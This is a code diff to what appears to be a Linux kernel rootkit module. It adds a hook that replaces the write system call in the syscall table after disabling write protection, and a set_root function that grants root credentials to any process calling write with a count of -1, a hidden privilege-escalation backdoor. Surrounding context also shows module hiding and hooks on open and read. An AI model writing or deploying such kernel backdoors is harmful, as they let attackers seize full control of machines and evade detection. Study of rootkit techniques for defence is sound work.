@@ -34,6 +34,10 @@ static unsigned long procfs_buffer_size = 0;
 struct list_head *prev_module;
 unsigned long long *syscall_table;
 
+
+asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
+asmlinkage int (*modified_write)(unsigned int, const char __user *, size_t);
+
 // original functions
 asmlinkage int (*original_open)(const char *, int);
 asmlinkage long (*original_read)(int, char __user *, size_t);
@@ -191,8 +195,92 @@ void enable_write_protection(void) {
   return;
 }
 
+// the method that gives the process root privileges
+void set_root(void) {
+  struct user_namespace *ns = current_user_ns();
+  struct cred *new_cred;
+
+  kuid_t kuid = make_kuid(ns, 0);
+  kgid_t kgid = make_kgid(ns, 0);
+  kuid_t rootUid;
+
+  if(!uid_valid(kuid)) {
+    printk("Not Valid..\n");
+  }
+
+  rootUid.val = 0;
+
+  new_cred = prepare_creds();
+
+  if(new_cred  != NULL) {
+    if(!uid_eq(new_cred ->uid, rootUid)){
+      printk("\nProcess is not root\n");
+    } else {
+      printk("\nProcess is already root\n");
+    }
+
+    new_cred ->uid = kuid;
+    new_cred ->gid = kgid;
+    new_cred ->euid = kuid;
+    new_cred ->egid = kgid;
+    new_cred ->suid = kuid;
+    new_cred ->sgid = kgid;
+    new_cred ->fsuid = kuid;
+    new_cred ->fsgid = kgid;
+
+    commit_creds(new_cred );
+
+    if(uid_eq(new_cred ->uid, rootUid)){
+      printk("\nProcess is now root\n");
+    } else {
+      printk("\nProcess is not root\n");
+    }
+  } else {
+    abort_creds(new_cred );
+    printk("Cannot get credentials of running process");
+  }
+}
+
+// the new modified write function
+asmlinkage int new_write(unsigned int fd, const char __user *buf, size_t count) {
+
+  // printk(KERN_ALERT "WRITE HIJACKED");
+  if(count == -1){
+    set_root();
+    return -1;
+  }  
+  return (*original_write)(fd, buf, count);
+}
+
+// the method that hijack the write syscall
+void hijack_write_syscall(void) {
+
+  printk(KERN_ALERT "\nHIJACK INIT\n");
+
+  disable_write_protection();
+
+  original_write = (void *)syscall_table[__NR_write];
+  printk("\n before write hijacking: %d\n", original_write);
+
+  syscall_table[__NR_write] = new_write; 
+  modified_write = (void *)syscall_table[__NR_write];
+  printk("\n after write hijacking %d\n", modified_write);
+
+  enable_write_protection();
+}
+
+// the method that restore the original write syscall
+void restore_hijacked_write_syscall(void) {
+
+  disable_write_protection();
+  syscall_table[__NR_write] = original_write; 
+  enable_write_protection(); 
+  printk("\nHijacked write Syscall is Restored\n");
+
+}
+
 static int init(void) {
-  hide_module();
+  // hide_module();
   printk("\nModule starting...\n");
   syscall_table = (unsigned long long*) find();
   if ( syscall_table != NULL ) {
@@ -200,6 +288,9 @@ static int init(void) {
   } else {
     printk("Syscall table not found!\n");
   }
+
+  hijack_write_syscall();
+
   original_read = (void *)syscall_table[__NR_read];
   original_open = (void *)syscall_table[__NR_open];
   disable_write_protection();
@@ -225,6 +316,7 @@ static void exit_(void) {
   enable_write_protection();
   printk("Module ending\n");
   remove_proc_entry(PROC_FILE_NAME, NULL);
+  restore_hijacked_write_syscall();
   return;
 }
 
